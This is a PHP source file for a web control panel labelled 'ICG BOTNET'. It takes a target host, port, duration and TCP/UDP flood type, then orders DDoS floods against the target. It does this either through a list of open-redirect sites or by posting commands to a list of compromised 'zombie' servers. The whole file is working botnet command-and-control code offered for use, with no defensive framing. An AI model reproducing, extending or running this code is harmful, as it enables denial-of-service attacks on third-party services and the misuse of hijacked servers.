<?php
set_time_limit(0);
ini_set('max_execution_time', 0);

?>
<!DOCTYPE html>
<html>
<head>
	<title>ICG BOTNET</title>
</head>
<body>
<form action="" method="post">
	<b>Target  (Dont use last slash /) : </b><br/>
	<input type="text" name="host" placeholder="Target ..."> <br/>
	<b>Port : </b><br/>
	<input type="number" name="port" placeholder="Port ..." value="25"><br/>
	<b>Time To DDos (s) :</b><br/>
	<input type="text" name="time" placeholder="Time to Ddos ..." value="3"> <br/>
	<b>Your Access password (Default: icg)</b><br/>
	<input type="Password" name="pass" placeholder="Your Zombie Password" value="icg"><br/>
	<b>Flood Type : </b><br/>
	<select name="type">
		<option value="tcp://">TCP</option>
		<option value="udp://">UDP</option>
	</select><br/>
	<b>Flood method (Use OpenRedirect Websites OR use server accesses) :</b> <br/>
	<select name="method">
		<option value="2">
			Use server Php access (Zombies)
		</option>
		<option value="1">
			Use OpenRdirect sites (Or zombies)
		</option>

	</select>
	<br/><br/>
	<input type="submit" name="submit"><br/>
</form>
<br/><br/>
</body>
</html>
<?php
if(isset($_POST['host']) && isset($_POST['port']) && isset($_POST['pass']) && isset($_POST['time']) && isset($_POST['type']) && $_POST['method']=="1"){
	$pass = $_POST['pass'];
	$host = $_POST['host'];
	$port = $_POST['port'];
	$type = $_POST['type'];
	$time = $_POST['time'];
	$op = file_get_contents("Zombie/orzombies.txt");
	$zombies = explode("\n", $op);
	foreach ($zombies as $zombie) {
		$url = $zombie.$host;
		$c = curl_init();
		$opt = array(
			CURLOPT_URL => $url,
			CURLOPT_POST => true,
			CURLOPT_RETURNTRANSFER => false,
			CURLOPT_HEADER => true,
			CURLOPT_FOLLOWLOCATION =>false,
			CURLOPT_NOBODY => true
			);
		curl_setopt_array($c, $opt);
		$res = curl_exec($c);
		curl_close($c);
		echo $res."<br/>";
}}
elseif(isset($_POST['host']) && isset($_POST['port']) && isset($_POST['pass']) && isset($_POST['time']) && isset($_POST['type']) && $_POST['method']=="2"){

	$pass = $_POST['pass'];
	$host = $_POST['host'];
	if(preg_match("/http:\/\//", $host)){
		$host = str_replace("http://", "", $host);
	}elseif(preg_match("/https:\/\//", $host)){
		$host = str_replace("https://", "", $host);
	}
	$port = $_POST['port'];
	$type = $_POST['type'];
	$time = $_POST['time'];
	$data = array(
		"type" => "$type",
		"host" => "$host",
		"time" => "$time",
		"port" => "$port",
		"pass" => "$pass"
		);

	$access = file_get_contents("Zombie/Zombies.txt");
	$accesss = explode("\r\n", $access);
	foreach ($accesss as $zombie) {
        $c = curl_init();
        curl_setopt($c, CURLOPT_URL, $zombie);
        curl_setopt($c, CURLOPT_POST, true);
        curl_setopt($c, CURLOPT_POSTFIELDS, $data);
        curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($c, CURLOPT_HEADER, true);
        $res = curl_exec($c);
        curl_close($c);
        echo "Command Sent to $zombie <br/>Target is: <br/>$type$host:$port<br/>$res<hr>";
}}
?>